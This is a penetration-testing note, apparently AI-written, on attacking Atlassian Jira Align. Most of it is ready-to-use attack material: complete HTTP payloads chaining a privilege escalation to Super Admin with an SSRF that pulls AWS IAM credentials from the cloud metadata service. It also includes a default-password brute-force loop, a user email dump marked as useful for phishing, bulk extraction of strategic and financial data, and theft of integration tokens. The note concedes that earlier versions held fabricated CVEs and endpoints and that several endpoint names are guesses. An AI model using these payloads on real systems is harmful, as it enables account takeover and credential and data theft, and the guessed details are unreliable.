# Jira Align (formerly AgileCraft)

#JiraAlign #Atlassian #AgileCraft #webservices #SSRF #privesc

## What is Jira Align?
Jira Align is Atlassian's enterprise agile planning platform (acquired from AgileCraft in 2019). It connects business strategy to technical execution — stores OKRs, roadmaps, PI plans, financial data, and portfolio-level strategy. High-value target in enterprise engagements: compromising Jira Align gives access to the organization's entire strategic planning data.

Attack surface (the 2022 Bishop Fox research): an **authenticated** SSRF (**CVE-2022-36802**, `ManageJiraConnectors`) that reaches cloud metadata, and a broken-authorization **privilege escalation** (**CVE-2022-36803**, `MasterUserEdit`) that turns a mid-tier "People"-permission user into Super Admin. Chained: low-priv → Super Admin → SSRF → the AWS credentials that provisioned the tenant.

Hosted at: `*.jiraalign.com` (cloud) or self-hosted.

---

## Ports

| Port | Protocol | Service |
|------|----------|---------|
| 443 | TCP | HTTPS (cloud: *.jiraalign.com) |
| 8080 | TCP | Self-hosted HTTP |
| 8443 | TCP | Self-hosted HTTPS |

---

## Tools

| Tool | Use |
|---|---|
| [[Tools/File Transfer/cURL\|cURL]] | All enumeration/exploitation — REST API, login, SSRF, privesc requests |
| [[Tools/Scanning/NMAP\|nmap]] | Port/TLS fingerprint for self-hosted instances |
| [[Tools/Web/Burpsuite\|Burp Suite]] | Intercept/replay the `ManageJiraConnectors` & `MasterUserEdit` POSTs (form params + `__STATE`) |

---

## Enumeration

```bash
# Identify Jira Align instance
# Cloud: https://<company>.jiraalign.com
# Self-hosted: may be at /jiraalign/ path or dedicated subdomain

# Version check + authoritative API discovery
curl -sk https://<target>/rest/align/api/2/version
# Interactive Swagger lists every real endpoint/resource for this instance:
#   https://<company>.jiraalign.com/rest/align/api/docs/index.html
# REST 2.0 base path is /rest/align/api/2/<resource> (e.g. /rest/align/api/2/epics)

# Check for login page
curl -sk https://<target>/login | grep -i 'jira align\|agilecraft\|atlassian'

# Common cloud subdomains to try
for sub in jiraalign align agile planning portfolio; do
  curl -sk -o /dev/null -w "%{http_code}" "https://$sub.<company>.com" | grep -v "000" && echo " $sub.<company>.com"
done

# Shodan
http.title:"Jira Align" ssl.cert.subject.cn:"jiraalign.com"
```

---

## CVEs

| CVE | CVSS | Description | Impact |
|-----|------|-------------|--------|
| CVE-2022-36802 | 8.8 | **SSRF** in the `ManageJiraConnectors` API (`txtAPIURL1` + `#` bypass) | Cloud (AWS IMDS) credential theft — **authenticated** |
| CVE-2022-36803 | 8.8 | **Broken authorization** in the `MasterUserEdit` API (`cmbRoleID=9`) | "People"-permission user → Super Admin |

Affected **10.107.4**; SSRF fixed **10.108.3.5**, both fully fixed **10.109.3** (2022-07-22).

> [!warning] **Corrected 2026-09-25.** An earlier version of this note wrongly labelled CVE-2022-36803 a *pre-auth SSRF (CVSS 10.0)* via a `/rest/request-proxy` endpoint, and listed CVE-2022-36804 (a **Bitbucket** command-injection CVE) and CVE-2023-22505/22508 (**Confluence** RCEs) as Jira Align issues. None of that was accurate — those entries and the fabricated endpoint have been removed. Per the Bishop Fox advisory the real bugs are **authenticated** (36802 SSRF, 36803 privesc).

---

## CVE-2022-36802 — SSRF via ManageJiraConnectors → Cloud Creds

The connector-settings form posts a target API URL in `txtAPIURL1`; Jira Align appends `/rest/api/2/` server-side, but a trailing `#` fragment truncates that suffix, so the request goes to an attacker-chosen URL. Requires an **authenticated** user with access to Connectors settings (chain from the privesc below if you only have low priv). Impact: retrieve the AWS credentials of the service account that provisioned the tenant.

```
POST /ManageJiraConnectors HTTP/1.1
Host: <company>.jiraalign.com
Content-Type: application/x-www-form-urlencoded
Cookie: <authenticated session>

cmbJiraConnectorID=1&txtURL1=https%3A%2F%2Fexample.atlassian.net%2Fbrowse%2F%7Bexternal%7D&txtConnectorName1=x&txtConnectorAdmin1=1&txtAPIURL1=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2Fiam%2Fsecurity-credentials%2F%23&ddlAuthType1=0&btnUpdateConnectors=Save&__STATE=<state>
```

- The `%23` (`#`) after the metadata path is what defeats the `/rest/api/2/` append.
- Point `txtAPIURL1` at `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>#` to pull the role's temporary AWS keys; the connector's test/response surfaces the fetched body.
- Easiest to build and replay in [[Tools/Web/Burpsuite|Burp Suite]] — the form has many fields plus a `__STATE` anti-CSRF token you must carry from the GET.

---

## Authentication & API Access

```bash
# Login
curl -sk -X POST "https://<target>/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin@company.com","password":"password"}' \
  -c cookies.txt -v 2>&1 | grep -i 'set-cookie\|token\|session'

# API token auth (if API key available)
curl -sk "https://<target>/rest/align/api/2/users" \
  -H "Authorization: Bearer <api-token>"

# Check for default/weak credentials
for cred in "admin:admin" "admin:password" "admin:Jira1234" "align:align"; do
  user=$(echo $cred | cut -d: -f1)
  pass=$(echo $cred | cut -d: -f2)
  resp=$(curl -sk -X POST "https://<target>/api/login" \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"$user\",\"password\":\"$pass\"}")
  echo "$cred: $resp" | grep -v "Invalid\|error"
done
```

---

## CVE-2022-36803 — Privilege Escalation via MasterUserEdit

The `MasterUserEdit` API enforces the target role only in the UI. A user holding the **"People"** permission (commonly granted to Program Managers) can intercept their own profile-save request and set `cmbRoleID=9` (Super Admin), escalating themselves — or any other user — to full Super Admin. Front-end restrictions are bypassed because the server doesn't re-check authorization for the role field.

```
POST /MasterUserEdit HTTP/1.1
Host: <company>.jiraalign.com
Content-Type: application/x-www-form-urlencoded
Cookie: <People-permission session>

btnSubmit=Save&txtStatus=Active&txtStartDate=1%2F1%2F2026&txtUID=<your-user-id>&txtFirst=J&txtLast=T&txtEmail=you%40company.com&txtTitle=x&cmbRoleID=9&cmbDivision=1&cmbRegion=1&cmbCity=1&cmbCostCenter=1&rbTimeType=1&UNIQ=<your-user-id>
```

- `cmbRoleID=9` is the Super Admin role; set `txtUID`/`UNIQ` to your own user id to self-escalate (or a victim's to hijack another account).
- Capture a legitimate profile-save first, then flip only `cmbRoleID` — carry every other field and the session cookie.
- After this, you have Connectors access → run the CVE-2022-36802 SSRF above for cloud creds.

---

## Data Enumeration (Authenticated)

Jira Align stores highly sensitive strategic data — OKRs, roadmaps, financials, personnel. All resources hang off the REST 2.0 base `/rest/align/api/2/`; authenticate with a Bearer API token.

> [!note] Confirm exact resource names/casing against the instance's Swagger (`/rest/align/api/docs/index.html`) — `epics`/`features`/`milestones` are documented; the others below (`programs`, `portfolios`, `objectives`, `budgets`, `teams`, `strategicDrivers`) are the likely names but vary by version/module.

```bash
# List all programs (top-level organizational units)
curl -sk "https://<target>/rest/align/api/2/programs" \
  -H "Authorization: Bearer <token>" | jq '.[].name'

# List all portfolios
curl -sk "https://<target>/rest/align/api/2/portfolios" \
  -H "Authorization: Bearer <token>"

# List OKRs (Objectives & Key Results)
curl -sk "https://<target>/rest/align/api/2/objectives" \
  -H "Authorization: Bearer <token>" | jq '.[] | {title:.title, description:.description}'

# List epics (feature roadmap)
curl -sk "https://<target>/rest/align/api/2/epics" \
  -H "Authorization: Bearer <token>"

# List all users (email + roles — useful for phishing)
curl -sk "https://<target>/rest/align/api/2/users?limit=1000" \
  -H "Authorization: Bearer <token>" | \
  jq '.[] | {name:.fullName, email:.email, role:.role}'

# Budget/financial data (if financial module enabled)
curl -sk "https://<target>/rest/align/api/2/budgets" \
  -H "Authorization: Bearer <token>"

# PI (Program Increment) plans — development roadmap
curl -sk "https://<target>/rest/align/api/2/pi?limit=100" \
  -H "Authorization: Bearer <token>"

# Teams and members
curl -sk "https://<target>/rest/align/api/2/teams" \
  -H "Authorization: Bearer <token>"

# Strategic themes
curl -sk "https://<target>/rest/align/api/2/strategicDrivers" \
  -H "Authorization: Bearer <token>"
```

---

## API Endpoint Discovery

```bash
# Jira Align REST API base paths
BASE="https://<target>"

# Common API endpoints to probe
endpoints=(
  "/rest/align/api/2/users"
  "/rest/align/api/2/programs"
  "/rest/align/api/2/portfolios"
  "/rest/align/api/2/epics"
  "/rest/align/api/2/features"
  "/rest/align/api/2/stories"
  "/rest/align/api/2/objectives"
  "/rest/align/api/2/currentUser"
  "/rest/align/api/2/config"
  "/rest/align/api/2/admin/users"
  "/rest/align/api/2/integrations"
  "/rest/align/api/2/webhooks"
  "/api/version"
)

for ep in "${endpoints[@]}"; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "$BASE$ep" -H "Authorization: Bearer <token>")
  echo "$code $ep"
done

# Check for exposed Swagger/OpenAPI docs
curl -sk "$BASE/swagger-ui.html"
curl -sk "$BASE/api-docs"
curl -sk "$BASE/v2/api-docs"
curl -sk "$BASE/rest/api"
```

---

## Integration Abuse

Jira Align integrates with Jira Software, Confluence, and other tools via OAuth/API keys stored server-side.

```bash
# List configured integrations (admin)
curl -sk "https://<target>/rest/align/api/2/integrations" \
  -H "Authorization: Bearer <admin-token>" | jq '.[] | {type:.type, config:.config}'

# Look for Jira Software integration credentials
# These may be stored API tokens with access to all Jira projects
curl -sk "https://<target>/rest/align/api/2/admin/integrations/jira" \
  -H "Authorization: Bearer <admin-token>"

# Check webhook configurations (may reveal internal URLs)
curl -sk "https://<target>/rest/align/api/2/webhooks" \
  -H "Authorization: Bearer <token>"

# SSRF via webhook — create webhook pointing to internal target
curl -sk -X POST "https://<target>/rest/align/api/2/webhooks" \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://internal-service/","events":["epic.created"]}'
```

---

## Dangerous Settings

| Config | Risk |
|--------|------|
| Unpatched < 10.109.3 | CVE-2022-36802 (SSRF→cloud creds) + CVE-2022-36803 (privesc→Super Admin), both authenticated |
| "People" permission granted broadly | CVE-2022-36803 self-escalation to Super Admin |
| Public registration enabled | Anyone can create account → access strategic data |
| All-users read on OKRs/roadmaps | Entire company strategy readable by any employee |
| Integration API tokens with broad scope | Lateral movement to Jira/Confluence |
| Admin API not restricted to internal IPs | Remote admin via stolen token |
| Financial data accessible to all users | Revenue, budget, headcount exposed |
| Webhooks without validation | SSRF to internal services |

---

## Quick Reference

| Goal | Command |
|---|---|
| Version / API discovery | `curl -sk https://host/rest/align/api/2/version` · Swagger `/rest/align/api/docs/index.html` |
| CVE-2022-36803 privesc | `POST /MasterUserEdit` with `cmbRoleID=9` (needs "People" perm) → Super Admin |
| CVE-2022-36802 SSRF | `POST /ManageJiraConnectors` `txtAPIURL1=http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>%23` |
| User enum (authed) | `curl -sk "https://host/rest/align/api/2/users?limit=1000" -H "Authorization: Bearer <token>"` |
| OKR / strategy dump | `curl -sk https://host/rest/align/api/2/objectives -H "Authorization: Bearer <token>"` |
| Integration creds (admin) | `curl -sk https://host/rest/align/api/2/integrations -H "Authorization: Bearer <admin-token>"` |

---

*Created: 2026-07-13*
*Updated: 2026-09-25*
*Model: claude-opus-4-8*
